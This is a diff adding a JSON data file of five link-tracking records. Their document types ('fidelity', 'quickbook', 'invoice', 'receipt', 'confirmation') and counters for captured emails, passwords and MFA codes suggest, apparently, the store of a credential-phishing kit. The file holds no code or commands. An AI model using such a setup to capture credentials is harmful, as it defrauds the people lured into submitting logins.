@@ -1,0 +1,120 @@
+{
+  "cfb0f96938d190842e8a16b4": {
+    "slug": "0f32a23486",
+    "userId": "u_9aef4935",
+    "email": "",
+    "documentType": "fidelity",
+    "maxPasswordAttempts": 3,
+    "passwordAttempts": 0,
+    "maxMfaAttempts": 3,
+    "mfaAttempts": 0,
+    "customTitle": null,
+    "customSubtitle": null,
+    "customFooter": null,
+    "createdBy": "go",
+    "createdFromIP": "127.0.0.1",
+    "createdAt": "2026-07-12T15:59:08.035Z",
+    "expiresAt": "2026-07-15T15:59:08.035Z",
+    "stats": {
+      "clicks": 55,
+      "opens": 38,
+      "emails": 0,
+      "passwords": 0,
+      "mfas": 0,
+      "uniqueClickIps": 15,
+      "uniqueOpenIps": 15,
+      "firstClick": "2026-07-12T15:59:15.219Z",
+      "firstOpen": "2026-07-12T15:59:15.401Z",
+      "firstSubmit": null,
+      "lastEvent": "2026-07-14T18:48:00.649Z"
+    }
+  },
+  "dca1107be585fe08302dd709": {
+    "slug": "0f32a23486",
+    "userId": "u_9aef4935",
+    "email": "",
+    "createdBy": "go",
+    "createdAt": "2026-07-13T08:06:22.814Z",
+    "expiresAt": "2026-07-16T08:06:22.814Z",
+    "documentType": "quickbook",
+    "stats": {
+      "clicks": 111,
+      "opens": 65,
+      "emails": 0,
+      "passwords": 0,
+      "mfas": 0,
+      "uniqueClickIps": 27,
+      "uniqueOpenIps": 23,
+      "firstClick": "2026-07-13T08:06:31.044Z",
+      "firstOpen": "2026-07-13T08:19:17.085Z",
+      "firstSubmit": null,
+      "lastEvent": "2026-07-14T18:48:10.840Z"
+    }
+  },
+  "2f9ea0af83fa056ca98c1e02": {
+    "slug": "0f32a23486",
+    "userId": "u_9aef4935",
+    "email": "",
+    "createdBy": "go",
+    "createdAt": "2026-07-13T12:57:44.509Z",
+    "expiresAt": "2026-07-16T12:57:44.509Z",
+    "documentType": "invoice",
+    "stats": {
+      "clicks": 21,
+      "opens": 12,
+      "emails": 0,
+      "passwords": 0,
+      "mfas": 0,
+      "uniqueClickIps": 6,
+      "uniqueOpenIps": 6,
+      "firstClick": "2026-07-13T12:57:53.686Z",
+      "firstOpen": "2026-07-13T12:57:53.753Z",
+      "firstSubmit": null,
+      "lastEvent": "2026-07-14T19:34:55.706Z"
+    }
+  },
+  "1448d9db2ce37d4a9f27dd30": {
+    "slug": "0f32a23486",
+    "userId": "u_9aef4935",
+    "email": "",
+    "createdBy": "go",
+    "createdAt": "2026-07-14T09:34:04.959Z",
+    "expiresAt": "2026-07-17T09:34:04.959Z",
+    "documentType": "receipt",
+    "stats": {
+      "clicks": 92,
+      "opens": 59,
+      "emails": 0,
+      "passwords": 0,
+      "mfas": 0,
+      "uniqueClickIps": 17,
+      "uniqueOpenIps": 15,
+      "firstClick": "2026-07-14T09:34:28.740Z",
+      "firstOpen": "2026-07-14T09:34:58.279Z",
+      "firstSubmit": null,
+      "lastEvent": "2026-07-14T20:43:25.203Z"
+    }
+  },
+  "832388fab288de71e6142581": {
+    "slug": "0f32a23486",
+    "userId": "u_9aef4935",
+    "email": "",
+    "createdBy": "go",
+    "createdAt": "2026-07-14T09:38:06.753Z",
+    "expiresAt": "2026-07-17T09:38:06.753Z",
+    "documentType": "confirmation",
+    "stats": {
+      "clicks": 84,
+      "opens": 60,
+      "emails": 0,
+      "passwords": 0,
+      "mfas": 0,
+      "uniqueClickIps": 18,
+      "uniqueOpenIps": 18,
+      "firstClick": "2026-07-14T09:39:01.379Z",
+      "firstOpen": "2026-07-14T09:39:01.446Z",
+      "firstSubmit": null,
+      "lastEvent": "2026-07-14T22:01:01.291Z"
+    }
+  }
+}
